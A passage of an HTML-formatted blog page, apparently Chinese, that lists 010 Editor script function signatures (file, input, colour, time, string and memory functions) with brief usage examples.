 </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileAttributesUnix</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileAttributesWin</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileAttributesUnix</span>(<span class="params"> <span class="keyword">int</span> attributes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileAttributesWin</span>(<span class="params"> <span class="keyword">int</span> attributes </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileCharSet</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetFileInterface</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetFileInterface</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> name[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetFileName</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetFileNum</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetReadOnly</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetReadOnly</span>(<span class="params"> <span class="keyword">int</span> <span class="keyword">readonly</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetTempDirectory</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTempFileName</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTemplateName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetTemplateNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetTemplateFileName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetTemplateFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetScriptName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetScriptNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetScriptFileName</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetScriptFileNameW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetWorkingDirectory</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function">wchar_t[] <span class="title">GetWorkingDirectoryW</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RenameFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> originalname[], <span class="keyword">const</span> <span class="keyword">char</span> newname[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RequiresFile</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RequiresVersion</span>(<span class="params"> <span class="keyword">int</span> majorVer, <span class="keyword">int</span> minorVer=<span class="number">0</span>, <span class="keyword">int</span> revision=<span class="number">0</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RunTemplate</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[]=<span class="string">""</span>, <span class="keyword">int</span> clearOutput=<span class="literal">false</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetWorkingDirectory</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> dir[] </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetWorkingDirectoryW</span>(<span class="params"> <span class="keyword">const</span> wchar_t dir[] </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//输入  </span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputDirectory</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> defaultDir[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">InputFloat</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InputNumber</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputOpenFileName</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function">TOpenFileNames <span class="title">InputOpenFileNames</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function">    <span class="keyword">int</span> i</span>;  </span><br><span class="line">    TOpenFileNames f = InputOpenFileNames(  </span><br><span class="line">    <span class="string">"Open File Test"</span>,  </span><br><span class="line">    <span class="string">"C Files (*.c *.cpp)|All Files (*.*)"</span> );  </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; f.count; i++ )  </span><br><span class="line">    Printf( <span class="string">"%s\n"</span>, f.file[i].filename );  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InputRadioButtonBox</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">int</span> defaultIndex, <span class="keyword">const</span> <span class="keyword">char</span> str1[], <span class="keyword">const</span> <span class="keyword">char</span> str2[], <span class="keyword">const</span> <span class="keyword">char</span> str3[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str4[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str5[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str6[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str7[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str8[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str9[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str10[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str11[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str12[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str13[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str14[]=<span class="string">""</span>, <span class="keyword">const</span> <span class="keyword">char</span> str15[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputSaveFileName</span>(<span class="params"> <span class="keyword">char</span> title[], <span class="keyword">char</span> filter[]=<span class="string">"All files (*.*)"</span>, <span class="keyword">char</span> filename[]=<span class="string">""</span>, <span class="keyword">char</span> extension[]=<span class="string">""</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">InputString</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> <span class="keyword">char</span> defaultValue[] </span>)  </span></span><br><span class="line"><span class="function">wstring <span class="title">InputWString</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> caption[], <span class="keyword">const</span> wstring defaultValue </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InsertFile</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[], int64 position </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsEditorFocused</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsModified</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsNoUIMode</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span>(<span class="params"> <span class="keyword">int</span> mask, <span class="keyword">const</span> <span class="keyword">char</span> title[], <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputPaneClear</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">OutputPaneSave</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputPaneCopy</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Printf</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function">    <span class="title">Printf</span>(<span class="params"> <span class="string">"Num = %d, Float = %lf, Str = '%s'\n"</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="string">"Test"</span> </span>)</span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">StatusMessage</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetSelSize</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetSelStart</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetSelection</span>(<span class="params"> int64 start, int64 size </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//颜色  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetForeColor</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBackColor</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetBackColor</span>(<span class="params"> <span class="keyword">int</span> color </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetColor</span>(<span class="params"> <span class="keyword">int</span> forecolor, <span class="keyword">int</span> backcolor </span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetForeColor</span>(<span class="params"> <span class="keyword">int</span> color </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetBytesPerLine</span>(<span class="params"></span>)<span class="comment">//获取显示列数  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//时间  </span></span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentTime</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentDate</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">string</span> <span class="title">GetCurrentDateTime</span>(<span class="params"> <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> </span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisableUndo</span>(<span class="params"></span>)<span class="comment">//禁止undo  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnableUndo</span>(<span class="params"></span>)<span class="comment">//允许undo  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="comment">//设置显示值  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatBinary</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatDecimal</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatHex</span>(<span class="params"></span>)   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFormatOctal</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Exec</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> program[], <span class="keyword">const</span> <span class="keyword">char</span> arguments[], <span class="keyword">int</span> wait=<span class="literal">false</span> </span>) <span class="keyword">int</span> <span class="title">Exec</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> program[], <span class="keyword">const</span> <span class="keyword">char</span> arguments[], <span class="keyword">int</span> wait, <span class="keyword">int</span> &amp;errorCode </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exit</span>(<span class="params"> <span class="keyword">int</span> errorcode </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Warning</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> format[] [, argument, ... ] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Terminate</span>(<span class="params"> <span class="keyword">int</span> force=<span class="literal">true</span> </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetArg</span>(<span class="params"> <span class="keyword">int</span> index </span>) wchar_t[] <span class="title">GetArgW</span>(<span class="params"> <span class="keyword">int</span> index </span>)<span class="comment">//获取传递给脚本的命令  </span></span></span><br><span class="line"><span class="function"><span class="keyword">char</span>[] <span class="title">GetEnv</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[] </span>)<span class="comment">//获取环境变量  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SetEnv</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">const</span> <span class="keyword">char</span> <span class="keyword">value</span>[] </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNumArgs</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExpandAll</span>(<span class="params"></span>)<span class="comment">//展开节点  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExportCSV</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//导出  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExportXML</span>(<span class="params"> <span class="keyword">const</span> <span class="keyword">char</span> filename[] </span>)<span class="comment">//导出  </span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">int64 <span class="title">GetCursorPos</span>(<span class="params"></span>)<span class="comment">//获取当前指针  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCursorPos</span>(<span class="params"> int64 pos </span>)  </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sleep</span>(<span class="params"> <span class="keyword">int</span> milliseconds </span>)</span></span><br></pre></td></tr></table></figure><p>字符串函数</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//类型转换  </span></span><br><span class="line"><span class="keyword">double</span> Atof( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> Atoi( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line">int64 BinaryStrToInt( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line">    <span class="keyword">return</span> BinaryStrToInt( <span class="string">"01001101"</span> );  </span><br><span class="line"><span class="keyword">char</span>[] ConvertString( <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> srcCharSet, <span class="keyword">int</span> destCharSet )  </span><br><span class="line">    CHARSET_ASCII CHARSET_ANSI CHARSET_OEM CHARSET_EBCDIC CHARSET_UNICODE CHARSET_MAC CHARSET_ARABIC CHARSET_BALTIC CHARSET_CHINESE_S CHARSET_CHINESE_T CHARSET_CYRILLIC CHARSET_EASTEUROPE CHARSET_GREEK CHARSET_HEBREW CHARSET_JAPANESE CHARSET_KOREAN_J CHARSET_KOREAN_W CHARSET_THAI CHARSET_TURKISH CHARSET_VIETNAMESE CHARSET_UTF8  </span><br><span class="line">string DosDateToString( DOSDATE d, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> )  </span><br><span class="line">string DosTimeToString( DOSTIME t, <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> )  </span><br><span class="line">string EnumToString( <span class="keyword">enum</span> e )  </span><br><span class="line">string FileTimeToString( FILETIME ft, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line">    <span class="keyword">int</span> hour, minute, second, day, month, year;  </span><br><span class="line">    string s = FileTimeToString( ft );  </span><br><span class="line">    SScanf( s, <span class="string">"%02d/%02d/%04d %02d:%02d:%02d"</span>,  </span><br><span class="line">    month, day, year, hour, minute, second );  </span><br><span class="line">    year++;  </span><br><span class="line">    SPrintf( s, <span class="string">"%02d/%02d/%04d %02d:%02d:%02d"</span>,  </span><br><span class="line">    month, day, year, hour, minute, second );  </span><br><span class="line"><span class="keyword">int</span> StringToDosDate( string s, DOSDATE &amp;d, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToDosTime( string s, DOSTIME &amp;t, <span class="keyword">char</span> format[] = <span class="string">"hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToFileTime( string s, FILETIME &amp;ft, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToOleTime( string s, OLETIME &amp;ot, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> StringToTimeT( string s, time_t &amp;t, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">char</span>[] StringToUTF8( <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> srcCharSet=CHARSET_ANSI )  </span><br><span class="line">wstring StringToWString( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> srcCharSet=CHARSET_ANSI )  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//内存操作  </span></span><br><span class="line"><span class="keyword">int</span> Memcmp( <span class="keyword">const</span> uchar s1[], <span class="keyword">const</span> uchar s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> Memcpy( uchar dest[], <span class="keyword">const</span> uchar src[], <span class="keyword">int</span> n, <span class="keyword">int</span> destOffset=<span class="number">0</span>, <span class="keyword">int</span> srcOffset=<span class="number">0</span> )  </span><br><span class="line"><span class="keyword">void</span> Memset( uchar s[], <span class="keyword">int</span> c, <span class="keyword">int</span> n )  </span><br><span class="line">string OleTimeToString( OLETIME ot, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">int</span> RegExMatch( string str, string regex ); <span class="comment">//正则匹配  </span></span><br><span class="line"><span class="keyword">int</span> RegExMatchW( wstring str, wstring regex );  </span><br><span class="line"><span class="keyword">int</span> RegExSearch( string str, string regex, <span class="keyword">int</span> &amp;matchSize, <span class="keyword">int</span> startPos=<span class="number">0</span> );   </span><br><span class="line"><span class="keyword">int</span> RegExSearchW( wstring str, wstring regex, <span class="keyword">int</span> &amp;matchSize, <span class="keyword">int</span> startPos=<span class="number">0</span> );  </span><br><span class="line">    <span class="keyword">if</span>( RegExMatch( <span class="string">"test@test.ca"</span>,  </span><br><span class="line">    <span class="string">"\\b[A-Za-z0-9.%_+\\-]+@[A-Za-z0-9.\\-]+\\.[A-Za-z]&#123;2,4&#125;\\b"</span> )  </span><br><span class="line">    == <span class="literal">false</span> )  </span><br><span class="line">    &#123;  </span><br><span class="line">    Warning( <span class="string">"Invalid email address"</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">int</span> result, size;  </span><br><span class="line">    result = RegExSearch(  </span><br><span class="line">    <span class="string">"12:03:23 AM - 192.168.0.10 : www.sweetscape.com/"</span>,  </span><br><span class="line">    <span class="string">"\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;.\\d&#123;1,3&#125;.\\d&#123;1,3&#125;"</span>, size );  </span><br><span class="line">    Printf( <span class="string">"Match at pos %d of size %d\n"</span>, result, size );  </span><br><span class="line"><span class="keyword">void</span> Strcat( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[] )  </span><br><span class="line"><span class="keyword">int</span> Strchr( <span class="keyword">const</span> <span class="keyword">char</span> s[], <span class="keyword">char</span> c )  </span><br><span class="line"><span class="keyword">int</span> Strcmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )   </span><br><span class="line"><span class="keyword">void</span> Strcpy( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[] )  </span><br><span class="line"><span class="keyword">char</span>[] StrDel( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count )   </span><br><span class="line"><span class="keyword">int</span> Stricmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )  </span><br><span class="line"><span class="keyword">int</span> Strlen( <span class="keyword">const</span> <span class="keyword">char</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> Strncmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> Strncpy( <span class="keyword">char</span> dest[], <span class="keyword">const</span> <span class="keyword">char</span> src[], <span class="keyword">int</span> n )   </span><br><span class="line"><span class="keyword">int</span> Strnicmp( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">int</span> Strstr( <span class="keyword">const</span> <span class="keyword">char</span> s1[], <span class="keyword">const</span> <span class="keyword">char</span> s2[] )  </span><br><span class="line"><span class="keyword">char</span>[] SubStr( <span class="keyword">const</span> <span class="keyword">char</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count=<span class="number">-1</span> )  </span><br><span class="line">string TimeTToString( time_t t, <span class="keyword">char</span> format[] = <span class="string">"MM/dd/yyyy hh:mm:ss"</span> )  </span><br><span class="line"><span class="keyword">char</span> ToLower( <span class="keyword">char</span> c ) <span class="keyword">wchar_t</span> ToLowerW( <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">char</span> ToUpper( <span class="keyword">char</span> c ) <span class="keyword">wchar_t</span> ToUpperW( <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">void</span> WMemcmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WMemcpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[], <span class="keyword">int</span> n, <span class="keyword">int</span> destOffset=<span class="number">0</span>, <span class="keyword">int</span> srcOffset=<span class="number">0</span> )  </span><br><span class="line"><span class="keyword">void</span> WMemset( <span class="keyword">wchar_t</span> s[], <span class="keyword">int</span> c, <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WStrcat( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[] )  </span><br><span class="line"><span class="keyword">int</span> WStrchr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s[], <span class="keyword">wchar_t</span> c )  </span><br><span class="line"><span class="keyword">int</span> WStrcmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">void</span> WStrcpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[] )  </span><br><span class="line"><span class="keyword">wchar_t</span>[] WStrDel( <span class="keyword">const</span> whar_t str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count )   </span><br><span class="line"><span class="keyword">int</span> WStricmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">char</span>[] WStringToString( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[], <span class="keyword">int</span> destCharSet=CHARSET_ANSI )  </span><br><span class="line"><span class="keyword">char</span>[] WStringToUTF8( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[] )  </span><br><span class="line"><span class="keyword">int</span> WStrlen( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s[] )  </span><br><span class="line"><span class="keyword">int</span> WStrncmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">void</span> WStrncpy( <span class="keyword">wchar_t</span> dest[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> src[], <span class="keyword">int</span> n )  </span><br><span class="line"><span class="keyword">int</span> WStrnicmp( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[], <span class="keyword">int</span> n )   </span><br><span class="line"><span class="keyword">int</span> WStrstr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> s1[], <span class="keyword">const</span> <span class="keyword">wchar_t</span> s2[] )  </span><br><span class="line"><span class="keyword">wchar_t</span>[] WSubStr( <span class="keyword">const</span> <span class="keyword">wchar_t</span> str[], <span class="keyword">int</span> start, <span class="keyword">int</span> count=<span class="number">-1</span> )  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span>[] FileNameGetBase( <span class="keyword">const</span> <span class="keyword">char</span> path[], <span class="keyword">int</span> includeExtension=<span class="literal">true</span> ) <span class="comment">//获取文件名  </span></span><br><span class="line"><span class="keyword">wchar_t</span>[] FileNameGetBaseW( <span class="keyword">const</span> <span class="keyword">wchar_t</span> path[], <span class="keyword">int</span> includeExtension=<span class="literal">true</span> )  